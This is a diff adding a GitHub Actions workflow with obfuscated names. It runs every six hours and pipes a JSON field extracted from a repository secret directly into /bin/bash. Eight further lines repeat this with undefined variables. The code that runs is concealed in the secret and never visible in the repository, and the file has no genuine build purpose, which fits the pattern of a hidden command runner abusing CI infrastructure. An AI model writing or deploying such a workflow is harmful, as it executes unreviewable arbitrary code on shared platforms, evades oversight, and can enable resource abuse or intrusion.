@@ -1,0 +1,24 @@
+name: dachuqish
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dachuqish
+        env:
+          r4716: ${{ secrets.r4716 }}
+        run: |
+          echo $r4716 | jq -r .pipe94923 | /bin/bash
+          echo $ypys48 | jq -r .qgtnf8478 | /bin/bash
+          echo $heo2931 | jq -r .wt06 | /bin/bash
+          echo $ef50773 | jq -r .qml606 | /bin/bash
+          echo $slikf08 | jq -r .joez40068 | /bin/bash
+          echo $ozwet13 | jq -r .vmnbm37667 | /bin/bash
+          echo $fjl4413 | jq -r .nq3 | /bin/bash
+          echo $lgwr83498 | jq -r .vdvx28378 | /bin/bash
+          echo $eqal5780 | jq -r .npk1819 | /bin/bash
+
